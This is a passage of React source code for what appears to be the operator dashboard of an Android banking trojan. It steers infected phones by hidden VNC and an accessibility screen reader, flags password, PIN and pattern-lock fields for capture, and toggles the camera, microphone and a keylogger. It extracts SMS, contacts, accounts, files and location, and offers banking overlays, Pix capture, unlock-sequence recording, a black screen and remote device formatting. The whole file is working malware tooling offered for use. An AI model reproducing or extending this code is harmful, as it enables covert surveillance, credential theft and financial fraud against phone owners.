            <span style={{ marginLeft: 'auto', fontSize: 9, color: 'var(--text3)' }}>
              {APK_W}×{APK_H} · click · drag · scroll · type
            </span>
          </div>

          {/* Canvas */}
          <div
            tabIndex={0} onKeyDown={onKbDown}
            style={{ outline: 'none', position: 'relative', touchAction: 'none' }}
          >
            <canvas ref={canvasRef} width={APK_W} height={APK_H}
              onPointerDown={onPtrDown} onPointerMove={onPtrMove}
              onPointerUp={onPtrUp} onPointerCancel={onPtrUp}
              onContextMenu={onCtxMenu} onWheel={onWheel}
              style={{
                display: 'block', width: '100%', height: 'auto',
                borderRadius: '0 0 8px 8px',
                border: '1px solid rgba(59,122,240,.22)', borderTop: 'none',
                cursor: vncOn ? 'crosshair' : 'default',
              }}
            />
            <canvas ref={overlayRef} width={APK_W} height={APK_H}
              style={{
                position: 'absolute', inset: 0, width: '100%', height: '100%',
                pointerEvents: 'none', borderRadius: '0 0 8px 8px',
              }}
            />
            {!vncOn && (
              <div style={{
                position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column',
                alignItems: 'center', justifyContent: 'center', gap: 10,
                background: 'rgba(0,0,0,.82)', borderRadius: '0 0 8px 8px',
              }}>
                {bankApp
                  ? <>
                      <div style={{ width: 2, height: 32, background: '#f87171', borderRadius: 1 }} />
                      <div style={{ fontWeight: 700, fontSize: 11, color: '#f87171', letterSpacing: 1 }}>FLAG_SECURE ACTIVE</div>
                      <div style={{ fontSize: 10, color: 'var(--text3)', textAlign: 'center', maxWidth: 200 }}>
                        VNC blocked. Use LY or V2 tab.
                      </div>
                    </>
                  : <>
                      <div className="spin" />
                      <div style={{ fontSize: 11, color: 'var(--text3)' }}>Waiting for stream...</div>
                    </>
                }
              </div>
            )}
          </div>

          {vncOn && (
            <div style={{ fontSize: 9, color: 'var(--text3)', textAlign: 'center', padding: '3px 0', letterSpacing: .3 }}>
              Click canvas · Type to inject text · Right-click = long press · Scroll = swipe
            </div>
          )}

          <div className="grid g2 mt6 mb6">
            <button className="btn btn-blue btn-block btn-sm" onClick={startVnc}>PLAY</button>
            <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>STOP</button>
            <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('FORCE_RESTART_VNC')}>RESTART</button>
            <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SNAP_SCREEN')}>SNAP</button>
          </div>

          <div className="card card-sm mb8">
            <div className="row-sb mb4">
              <span className="txt-xs txt-dim">JPEG QUALITY</span>
              <span className="txt-xs txt-gold bold">{vncQual}%</span>
            </div>
            <input type="range" min="10" max="100" value={vncQual}
              style={{ width: '100%', accentColor: 'var(--gold)' }}
              onChange={e => {
                setVncQual(+e.target.value);
                sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value });
              }} />
          </div>

          <NavGrid sendCmd={sendCmd} />
        </div>
      )}

      {/* ════════════════════════════════════════
          LY — LAYOUT OVERLAY CANVAS
      ════════════════════════════════════════ */}
      {mode === 'LY' && (
        <div>
          {/* Toolbar */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 6, padding: '5px 10px',
            borderRadius: '8px 8px 0 0', background: 'rgba(6,4,14,.96)',
            border: '1px solid rgba(255,255,255,.06)', borderBottom: 'none',
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#d4950a', letterSpacing: 1.5 }}>LY</span>
            <div style={{ width: 1, height: 12, background: 'rgba(255,255,255,.1)', flexShrink: 0 }} />
            {nodes.length > 0 && <>
              <span style={{ fontSize: 10, color: '#fbbf24' }}>{nodes.filter(n=>n.clickable).length} TAP</span>
              <span style={{ fontSize: 10, color: '#c084fc' }}>{nodes.filter(n=>n.isKeyboard).length} KBD</span>
              <span style={{ fontSize: 10, color: '#4ade80' }}>{nodes.filter(n=>n.scrollable).length} SCROLL</span>
              {pwdNodes.length > 0 && <span style={{ fontSize: 10, color: '#f87171', fontWeight: 700 }}>{pwdNodes.length} PWD</span>}
              {lyScreenRes && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{lyScreenRes.w}×{lyScreenRes.h}</span>}
            </>}
            <div style={{ display: 'flex', gap: 3, marginLeft: 'auto' }}>
              <button onClick={() => setLyZoom(v => v === 1 ? 1.7 : v === 1.7 ? 2.5 : 1)}
                className="btn btn-ghost btn-xs" style={{ fontSize: 10, minWidth: 30 }}>
                {lyZoom}×
              </button>
              <button onClick={() => setShowLabels(v => !v)}
                className={`btn btn-xs ${showLabels ? 'btn-gold' : 'btn-ghost'}`}
                style={{ fontSize: 10 }}>Aa</button>
              <button onClick={() => setLiveMode(v => !v)}
                className={`btn btn-xs ${liveMode ? 'btn-red' : 'btn-ghost'}`}
                style={{ fontSize: 10 }}>{liveMode ? '●' : '○'}</button>
              <button onClick={() => sendCmd('REQUEST_HIERARCHY')}
                className="btn btn-ghost btn-xs" style={{ fontSize: 10 }}>↺</button>
            </div>
          </div>

          {/* Search */}
          <div style={{
            background: 'rgba(6,4,14,.9)', padding: '5px 10px',
            border: '1px solid rgba(255,255,255,.06)', borderTop: 'none', borderBottom: 'none',
          }}>
            <input className="input" style={{ width: '100%', fontSize: 11, padding: '4px 8px' }}
              placeholder="Search canvas by text or class..."
              value={lySearch} onChange={e => setLySearch(e.target.value)} />
          </div>

          {/* Canvas wrapper */}
          <div style={{
            overflow: lyZoom > 1 ? 'auto' : 'hidden',
            border: '1px solid rgba(212,149,10,.18)', borderTop: 'none',
            borderRadius: '0 0 8px 8px', background: '#06080f', minHeight: 100,
          }}>
            <div style={{
              transform: `scale(${lyZoom})`, transformOrigin: 'top left',
              width: `${100 / lyZoom}%`, touchAction: 'none', cursor: 'crosshair',
            }}
              onPointerDown={onLyPtrDown}
              onPointerUp={onLyPtrUp}
              onPointerCancel={onLyPtrUp}
            >
              <canvas
                ref={node => {
                  lyCanvasRef.current = node;
                  if (node && nodes.length) {
                    lyScaleRef.current = drawLY(node, nodes, {
                      highlight: lyHighlight, searchTerm: lySearch, showLabels,
                    });
                  }
                }}
                style={{ display: 'block', width: '100%' }}
              />
            </div>
            {!nodes.length && (
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 40 }}>
                <span style={{ fontSize: 9, color: 'var(--text3)', letterSpacing: 2 }}>TAP ↺ TO LOAD HIERARCHY</span>
              </div>
            )}
          </div>

          {/* Legend */}
          <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap', marginTop: 8, marginBottom: 8 }}>
            {[['TAP','#fbbf24'],['EDIT','#34d399'],['SCROLL','#4ade80'],
              ['KBD','#c084fc'],['PIN','#60a5fa'],['PWD','#f87171'],['OFF','#475569']
            ].map(([l, c]) => (
              <span key={l} style={{
                fontSize: 9, padding: '2px 6px', borderRadius: 4, fontWeight: 700,
                border: `1px solid ${c}50`, color: c, letterSpacing: .5,
              }}>{l}</span>
            ))}
          </div>

          {/* Selected node card */}
          {lySelected && (
            <div className="card card-sm mb8"
              style={{ border: `1px solid ${nodeColor(lySelected)}30` }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                <span style={{ fontSize: 11, fontWeight: 800, color: nodeColor(lySelected) }}>
                  {lySelected.cls.split('.').pop() || lySelected.cls}
                </span>
                <button className="btn btn-ghost btn-xs" onClick={() => setLySelected(null)}>✕</button>
              </div>
              {lySelected.text && (
                <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)', marginBottom: 4 }}>
                  "{lySelected.text}"
                </div>
              )}
              {lySelected.id && (
                <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', marginBottom: 4 }}>
                  #{lySelected.id.split('/').pop()}
                </div>
              )}
              {lySelected.bounds && (
                <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', marginBottom: 8 }}>
                  [{lySelected.bounds.left},{lySelected.bounds.top}]→[{lySelected.bounds.right},{lySelected.bounds.bottom}]
                  {' '}({lySelected.bounds.right-lySelected.bounds.left}×{lySelected.bounds.bottom-lySelected.bounds.top}px)
                </div>
              )}
              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                <button className="btn btn-gold btn-sm" style={{ flex: 1, minWidth: 54 }}
                  onClick={() => tapNode(lySelected)}>TAP</button>
                {lySelected.longClickable && (
                  <button className="btn btn-ghost btn-sm" style={{ flex: 1, minWidth: 54 }}
                    onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('LONG_PRESS', { x: c.x, y: c.y, duration: 800 }); }}>
                    HOLD
                  </button>
                )}
                {lySelected.scrollable && (
                  <>
                    <button className="btn btn-ghost btn-sm"
                      onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y-200, x2: c.x, y2: c.y+200, duration: 150 }); }}>↓</button>
                    <button className="btn btn-ghost btn-sm"
                      onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y+200, x2: c.x, y2: c.y-200, duration: 150 }); }}>↑</button>
                  </>
                )}
                {lySelected.editable && (
                  <button className="btn btn-blue btn-sm" style={{ flex: 1, minWidth: 54 }}
                    onClick={() => tapNode(lySelected)}>EDIT</button>
                )}
              </div>
              {lySelected.isPatternLock && lySelected.patternGrid && (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 5, marginTop: 8, maxWidth: 108 }}>
                  {lySelected.patternGrid.map((pt, i) => (
                    <button key={i} className="btn btn-ghost btn-sm"
                      style={{ fontSize: 13, fontWeight: 800 }}
                      onClick={() => sendCmd('TAP', { x: pt.x, y: pt.y })}>{i + 1}</button>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Inline PIN pad (when detected) */}
          {pinNodes.length > 0 && (
            <div className="card card-sm mb6" style={{ border: '1px solid rgba(96,165,250,.25)' }}>
              <div style={{ fontSize: 9, color: '#60a5fa', fontWeight: 700, letterSpacing: 1.5, marginBottom: 8 }}>PIN</div>
              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                {pinNodes.map((n, i) => (
                  <button key={i} className="btn btn-blue btn-sm"
                    style={{ minWidth: 40, fontSize: 16, fontWeight: 800 }}
                    onClick={() => tapNode(n)}>{n.text}</button>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ════════════════════════════════════════
          V2 — SCREEN READER
      ════════════════════════════════════════ */}
      {mode === 'V2' && (
        <div>
          {/* Status row */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px',
            marginBottom: 10, borderRadius: 10, background: 'var(--card2)',
            border: '1px solid rgba(255,255,255,.05)',
          }}>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)',
                overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                {srPkg || '—'}
              </div>
            </div>
            <div onClick={() => toggleSR(!srOn)} style={{
              display: 'flex', alignItems: 'center', gap: 5, cursor: 'pointer',
              padding: '4px 10px', borderRadius: 8,
              background: srOn ? 'rgba(74,222,128,.08)' : 'var(--bg3)',
              border: `1px solid ${srOn ? 'rgba(74,222,128,.28)' : 'var(--border)'}`,
            }}>
              <div style={{
                width: 6, height: 6, borderRadius: '50%',
                background: srOn ? '#4ade80' : 'var(--text3)',
                boxShadow: srOn ? '0 0 5px #4ade80' : 'none',
              }} />
              <span style={{ fontSize: 10, fontWeight: 700, color: srOn ? '#4ade80' : 'var(--text3)' }}>
                {srOn ? `ON · ${srHz}/s` : 'OFF'}
              </span>
            </div>
            <button className="btn btn-ghost btn-xs"
              onClick={() => { sendCmd('REQUEST_HIERARCHY'); toast2('REFRESH', '#fbbf24'); }}>↺</button>
          </div>

          {/* Stats pills */}
          {nodes.length > 0 && (
            <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap', marginBottom: 10 }}>
              <Chip col="#d4950a">{nodes.length} nodes</Chip>
              <Chip col="#fbbf24">{nodes.filter(n=>n.clickable&&n.text).length} tap</Chip>
              {pwdNodes.length > 0 && <Chip col="#f87171">{pwdNodes.length} pwd</Chip>}
              {pinNodes.length > 0 && <Chip col="#60a5fa">PIN</Chip>}
              {patNode          && <Chip col="#818cf8">PATTERN</Chip>}
              {swipeNode        && <Chip col="#4ade80">SWIPE</Chip>}
            </div>
          )}

          {/* Bank alert */}
          {bankApp && (
            <div style={{
              display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px',
              marginBottom: 10, borderRadius: 10,
              background: 'rgba(248,113,113,.05)', border: '1px solid rgba(248,113,113,.28)',
            }}>
              <div style={{ width: 3, height: 30, background: '#f87171', borderRadius: 2, flexShrink: 0 }} />
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontWeight: 700, fontSize: 11, color: '#f87171', letterSpacing: .5 }}>FLAG_SECURE · VNC BLOCKED</div>
                <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', marginTop: 2,
                  overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{srPkg}</div>
              </div>
              <span style={{ fontSize: 9, fontWeight: 700, color: srOn ? '#4ade80' : 'var(--text3)' }}>
                {srOn ? 'SR ON' : 'SR OFF'}
              </span>
            </div>
          )}

          {/* Password fields */}
          {pwdNodes.length > 0 && (
            <div style={{ marginBottom: 10 }}>
              {pwdNodes.map((n, i) => (
                <div key={i} onClick={() => tapNode(n)} style={{
                  display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', marginBottom: 4,
                  borderRadius: 8, cursor: 'pointer',
                  background: 'rgba(248,113,113,.05)', border: '1px solid rgba(248,113,113,.28)',
                }}>
                  <div style={{ width: 3, height: 26, background: '#f87171', borderRadius: 2, flexShrink: 0 }} />
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: 11, fontWeight: 700, color: '#f87171', letterSpacing: .5 }}>
                      PASSWORD FIELD{n.focused ? ' · FOCUSED' : ''}
                    </div>
                    <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', marginTop: 2 }}>
                      {n.cls.split('.').pop()}{n.id ? ` #${n.id.split('/').pop()}` : ''}
                    </div>
                  </div>
                  {n.bounds && (
                    <span style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', flexShrink: 0 }}>
                      {Math.round((n.bounds.left + n.bounds.right) / 2)},{Math.round((n.bounds.top + n.bounds.bottom) / 2)}
                    </span>
                  )}
                </div>
              ))}
            </div>
          )}

          {/* PIN pad */}
          {pinNodes.length > 0 && (
            <div style={{
              padding: '10px 12px', marginBottom: 10, borderRadius: 10,
              background: 'rgba(96,165,250,.05)', border: '1px solid rgba(96,165,250,.28)',
            }}>
              <div style={{ fontSize: 9, color: '#60a5fa', fontWeight: 700, letterSpacing: 1.5, marginBottom: 8 }}>PIN DETECTED</div>
              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                {pinNodes.map((n, i) => (
                  <button key={i} onClick={() => tapNode(n)} style={{
                    padding: '6px 12px', fontSize: 16, fontWeight: 800, fontFamily: 'var(--mono)',
                    borderRadius: 8, border: '1px solid rgba(96,165,250,.35)',
                    background: 'rgba(96,165,250,.09)', color: '#93c5fd', cursor: 'pointer',
                  }}>{n.text}</button>
                ))}
              </div>
            </div>
          )}

          {/* Pattern lock */}
          {patNode?.patternGrid && (
            <div style={{
              padding: '10px 12px', marginBottom: 10, borderRadius: 10,
              background: 'rgba(129,140,248,.05)', border: '1px solid rgba(129,140,248,.28)',
            }}>
              <div style={{ fontSize: 9, color: '#818cf8', fontWeight: 700, letterSpacing: 1.5, marginBottom: 8 }}>PATTERN LOCK</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 6, maxWidth: 150, margin: '0 auto' }}>
                {patNode.patternGrid.map((pt, i) => (
                  <button key={i} onClick={() => sendCmd('TAP', { x: pt.x, y: pt.y })} style={{
                    aspectRatio: '1', borderRadius: '50%', border: '2px solid rgba(129,140,248,.35)',
                    background: 'rgba(129,140,248,.07)', color: '#818cf8',
                    fontWeight: 800, fontSize: 14, cursor: 'pointer',
                  }}>{i + 1}</button>
                ))}
              </div>
            </div>
          )}

          {/* Swipe unlock */}
          {swipeNode?.swipeHint && (
            <div style={{
              padding: '10px 12px', marginBottom: 10, borderRadius: 10,
              background: 'rgba(74,222,128,.04)', border: '1px solid rgba(74,222,128,.22)',
            }}>
              <div style={{ fontSize: 9, color: '#4ade80', fontWeight: 700, letterSpacing: 1.5, marginBottom: 6 }}>SWIPE UNLOCK</div>
              <button className="btn btn-green btn-block btn-sm"
                onClick={() => {
                  const h = swipeNode.swipeHint;
                  sendCmd('SWIPE', { x1: h.sx, y1: h.sy, x2: h.ex, y2: h.ey, duration: 400 });
                }}>EXECUTE</button>
            </div>
          )}

          {/* V2 sub-tabs */}
          <div style={{ display: 'flex', gap: 3, marginBottom: 10 }}>
            {[['ocr','OCR'],['nodes','NODES'],['creds','CREDS'],['raw','RAW']].map(([id, label]) => (
              <button key={id} onClick={() => setV2tab(id)} style={{
                flex: 1, padding: '5px 0', fontSize: 10, fontWeight: 700, letterSpacing: .5,
                borderRadius: 8, border: 'none', cursor: 'pointer',
                background: v2tab === id ? 'var(--gold)' : 'var(--bg3)',
                color: v2tab === id ? '#000' : 'var(--text3)',
                transition: 'background .1s',
              }}>{label}</button>
            ))}
          </div>

          {v2tab === 'ocr' && (
            <div style={{ maxHeight: 440, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
              {lines.length === 0
                ? <NoData msg="Tap ↺ to load screen hierarchy" />
                : lines.map((row, ri) => (
                    <div key={ri} style={{
                      display: 'flex', gap: 4, flexWrap: 'wrap', padding: '3px 6px',
                      borderRadius: 5, background: ri % 2 === 0 ? 'rgba(212,149,10,.035)' : 'transparent',
                    }}>
                      {row.map((nd, ni) => (
                        <button key={ni} onClick={() => tapNode(nd)} style={{
                          background: nd.isPinDigit ? 'rgba(96,165,250,.1)' : nd.password ? 'rgba(248,113,113,.09)' :
                            nd.isKeyboard ? 'rgba(192,132,252,.09)' : nd.clickable ? 'rgba(251,191,36,.09)' : 'rgba(255,255,255,.025)',
                          border: `1px solid ${nd.isPinDigit ? '#60a5fa40' : nd.password ? '#f8717140' :
                            nd.isKeyboard ? '#c084fc40' : nd.clickable ? '#fbbf2440' : '#ffffff0a'}`,
                          borderRadius: 5, padding: '3px 8px',
                          color: nd.isPinDigit ? '#60a5fa' : nd.password ? '#f87171' :
                            nd.isKeyboard ? '#c084fc' : nd.clickable ? '#fbbf24' : 'var(--text2)',
                          fontSize: 12, fontWeight: nd.clickable ? 700 : 400,
                          cursor: nd.clickable ? 'pointer' : 'default',
                          opacity: nd.enabled ? 1 : 0.5,
                        }}>
                          {nd.text}
                          {nd.password && <span style={{ marginLeft: 3, fontSize: 10 }}>🔒</span>}
                          {nd.checked  && <span style={{ marginLeft: 3, color: '#4ade80' }}>✓</span>}
                        </button>
                      ))}
                    </div>
                  ))
              }
            </div>
          )}

          {v2tab === 'nodes' && (
            <>
              <div style={{ display: 'flex', gap: 6, marginBottom: 8 }}>
                <input className="input" placeholder="Filter..." value={filter}
                  onChange={e => setFilter(e.target.value)} style={{ flex: 1 }} />
                <span style={{ fontSize: 10, color: 'var(--text3)', alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  {filtered.length}/{nodes.length}
                </span>
              </div>
              <div style={{ maxHeight: 450, overflowY: 'auto' }}>
                {filtered.length === 0
                  ? <NoData msg="No nodes found" />
                  : filtered.slice(0, 300).map((n, i) => (
                      <NodeRow key={i} n={n} onTap={() => n.clickable && tapNode(n)} />
                    ))
                }
              </div>
            </>
          )}

          {v2tab === 'creds' && (
            <div style={{ maxHeight: 450, overflowY: 'auto' }}>
              {nodes.filter(n => n.password || n.isPinDigit || n.editable).length === 0
                ? <NoData msg="No credentials detected" />
                : nodes.filter(n => n.password || n.isPinDigit || n.editable).map((n, i) => (
                    <NodeRow key={i} n={n} onTap={() => tapNode(n)} highlight />
                  ))
              }
            </div>
          )}

          {v2tab === 'raw' && (
            <>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                <span style={{ fontSize: 10, color: 'var(--text3)' }}>
                  {rawData.length.toLocaleString()} chars · {srPkg || '—'}
                </span>
                <button onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}
                  style={{
                    fontSize: 10, padding: '2px 8px', borderRadius: 5, cursor: 'pointer',
                    border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)',
                  }}>COPY</button>
              </div>
              <div style={{
                background: '#02030a', border: '1px solid rgba(255,255,255,.05)', borderRadius: 8,
                padding: 10, height: 420, overflowY: 'auto', overflowX: 'auto',
                fontFamily: 'var(--mono)', fontSize: 9.5, color: '#8a9cc0',
                whiteSpace: 'pre', lineHeight: 1.6,
              }}>
                {rawData || 'No data. Activate Screen Reader and wait.'}
              </div>
            </>
          )}
        </div>
      )}

      {/* ════════════════════════════════════════
          CONTROLS
      ════════════════════════════════════════ */}
      {mode === 'CTRL' && (
        <div>
          <Sect label="LIVE" />
          <CtrlRow label="Device Info"  onClick={() => sendCmd('GET_DEVICE_INFO')} />
          <CtrlRow label="Camera"       state={device.camera_active}      onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !device.camera_active })} />
          <CtrlRow label="Microphone"   state={device.mic_active}         onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !device.mic_active })} />
          <CtrlRow label="Keylogger"    state={device.keylogger_active}   onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !device.keylogger_active })} />

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 5, marginBottom: 5 }}>
            <button className="btn btn-green btn-sm btn-block"
              onClick={() => { toggleSR(true); setMode('V2'); }}>SR ON</button>
            <button className="btn btn-ghost btn-sm btn-block"
              onClick={() => toggleSR(false)}>SR OFF</button>
          </div>

          <Sect label="EXTRACTION" />
          <CtrlRow label="Google Accounts" onClick={() => sendCmd('GET_ACCOUNTS')} />
          <CtrlRow label="File Manager"    onClick={() => sendCmd('FILE_LIST', { path: '/sdcard' })} />
          <CtrlRow label="SMS"             onClick={() => sendCmd('GET_SMS')} />
          <CtrlRow label="Apps"            onClick={() => sendCmd('GET_INSTALLED_APPS')} />
          <CtrlRow label="Contacts"        onClick={() => sendCmd('GET_CONTACTS')} />
          <CtrlRow label="GPS"             onClick={() => sendCmd('GET_LOCATION')} />

          <Sect label="FINANCIAL" />
          <CtrlRow label="Banking Overlay"  onClick={() => sendCmd('BLACK_SCREEN_ON')} />
          <CtrlRow label="Pix Capture"      onClick={() => setMode('V2')} />
          <CtrlRow label="Unlock Sequences" onClick={() => sendCmd('START_UNLOCK_RECORDING')} />

          <Sect label="SECURITY" />
          <CtrlRow label="Admin Status"   onClick={() => sendCmd('CHECK_ADMIN_STATUS')} />
          <CtrlRow label="Banks Crypter"  state={device.banks_crypter}
            onClick={() => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: !device.banks_crypter })} />
          <CtrlRow label="Black Screen"   state={undefined}
            onClick={() => sendCmd('BLACK_SCREEN_ON')} />

          <Sect label="INJECT" />
          <div className="card card-sm mb8">
            <div style={{ display: 'flex', gap: 6, marginBottom: 8 }}>
              <input className="input" placeholder="Text to inject..." value={typeText}
                onChange={e => setTypeText(e.target.value)}
                onKeyDown={e => { if (e.key==='Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); } }}
                style={{ flex: 1 }} />
              <button className="btn btn-gold btn-sm"
                onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>TYPE</button>
            </div>
            <div style={{ display: 'flex', gap: 6 }}>
              <input className="input" placeholder="X" type="number" value={tapX}
                onChange={e => setTapX(e.target.value)} style={{ width: 64 }} />
              <input className="input" placeholder="Y" type="number" value={tapY}
                onChange={e => setTapY(e.target.value)} style={{ width: 64 }} />
              <button className="btn btn-gold btn-sm"
                onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
              <button className="btn btn-ghost btn-sm"
                onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY, duration: 800 })}>HOLD</button>
            </div>
          </div>

          <Sect label="NAVIGATION" />
          <NavGrid sendCmd={sendCmd} />

          <Sect label="SYSTEM" />
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 5, marginTop: 4 }}>
            <button className="btn btn-danger-soft btn-sm btn-block"
              onClick={() => { if (confirm('Self destruct?')) sendCmd('SELF_DESTRUCT'); }}>DESTRUCT</button>
            <button className="btn btn-danger-soft btn-sm btn-block"
              onClick={() => { if (confirm('Format device?')) sendCmd('FORMAT_DEVICE'); }}>FORMAT</button>
          </div>
        </div>
      )}

    </div>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function Chip({ col, children }) {
  return (
    <span style={{
      fontSize: 9, padding: '1px 6px', borderRadius: 4, fontWeight: 700, letterSpacing: .3,
      background: `${col}16`, color: col, border: `1px solid ${col}32`,
    }}>{children}</span>
  );
}

function QualBars({ qual }) {
  return (
    <span style={{ display: 'flex', alignItems: 'flex-end', gap: 2 }}>
      {[1,2,3,4,5].map(i => (
        <span key={i} style={{
          width: 3, height: 5 + i*2, display: 'block', borderRadius: 1,
          background: i <= qual.bars ? qual.col : '#1e293b',
        }} />
      ))}
    </span>
  );
}

function NoData({ msg }) {
  return (
    <div style={{ textAlign: 'center', padding: '36px 16px' }}>
      <div style={{ fontSize: 9, color: 'var(--text3)', letterSpacing: 2 }}>{msg.toUpperCase()}</div>
    </div>
  );
}

function NodeRow({ n, onTap, highlight }) {
  const col = nodeColor(n);
  return (
    <div onClick={onTap} style={{
      padding: '6px 8px', paddingLeft: 8 + (n.depth || 0) * 4, marginBottom: 3,
      borderRadius: 6, borderLeft: `3px solid ${col}`,
      background: highlight ? 'rgba(248,113,113,.04)' : 'rgba(255,255,255,.02)',
      border: highlight ? '1px solid rgba(248,113,113,.25)' : undefined,
      cursor: n.clickable ? 'pointer' : 'default',
      opacity: n.enabled ? 1 : 0.42,
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 6 }}>
        <div style={{ flex: 1, minWidth: 0 }}>
          {n.text && (
            <div style={{ fontWeight: 600, fontSize: 12, marginBottom: 2, wordBreak: 'break-word',
              color: n.password ? '#f87171' : 'var(--text)' }}>
              {n.text}
            </div>
          )}
          <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)',
            overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {n.cls.split('.').pop()}{n.id ? ` #${n.id.split('/').pop()}` : ''}
          </div>
        </div>
        <div style={{ display: 'flex', gap: 3, flexShrink: 0, alignItems: 'center' }}>
          {n.clickable  && <Tag col="#fbbf24">TAP</Tag>}
          {n.editable   && <Tag col="#34d399">EDIT</Tag>}
          {n.password   && <Tag col="#f87171">PWD</Tag>}
          {n.scrollable && <Tag col="#4ade80">↕</Tag>}
          {n.isPinDigit && <Tag col="#60a5fa">PIN</Tag>}
          {n.checked    && <Tag col="#4ade80">✓</Tag>}
        </div>
      </div>
      {n.bounds && (
        <div style={{ fontSize: 9, color: 'var(--text3)', marginTop: 3, fontFamily: 'var(--mono)' }}>
          {n.bounds.left},{n.bounds.top}→{n.bounds.right},{n.bounds.bottom}
          {n.clickable && (
            <span style={{ color: 'var(--text2)', marginLeft: 6 }}>
              tap({Math.round((n.bounds.left+n.bounds.right)/2)},{Math.round((n.bounds.top+n.bounds.bottom)/2)})
            </span>
          )}
        </div>
      )}
    </div>
  );
}

function Tag({ col, children }) {
  return (
    <span style={{
      fontSize: 8, padding: '1px 4px', borderRadius: 3, fontWeight: 700,
      border: `1px solid ${col}40`, color: col, flexShrink: 0,
    }}>{children}</span>
  );
}

function Sect({ label }) {
  return (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 6,
      marginTop: 16, marginBottom: 6,
      fontSize: 9, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2,
    }}>
      {label}
      <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,.05)', marginLeft: 4 }} />
    </div>
  );
}

function CtrlRow({ label, state, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
      padding: '10px 14px', marginBottom: 4, borderRadius: 8, cursor: 'pointer',
      background: 'rgba(255,255,255,.02)',
      border: '1px solid rgba(255,255,255,.05)',
    }}>
      <span style={{ fontWeight: 600, fontSize: 12, color: 'var(--text)' }}>{label}</span>
      {state != null && (
        <span style={{ fontSize: 9, fontWeight: 700, letterSpacing: .5,
          color: state ? '#4ade80' : 'rgba(255,255,255,.18)' }}>
          {state ? 'ON' : 'OFF'}
        </span>
      )}
    </div>
  );
}

function NavGrid({ sendCmd }) {
  return (
    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 5, marginBottom: 10 }}>
      {[
        ['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
        ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE'],
      ].map(([icon, action]) => (
        <button key={action} className="btn btn-ghost btn-sm btn-block"
          onClick={() => sendCmd(action)}>{icon}</button>
      ))}
    </div>
  );
}
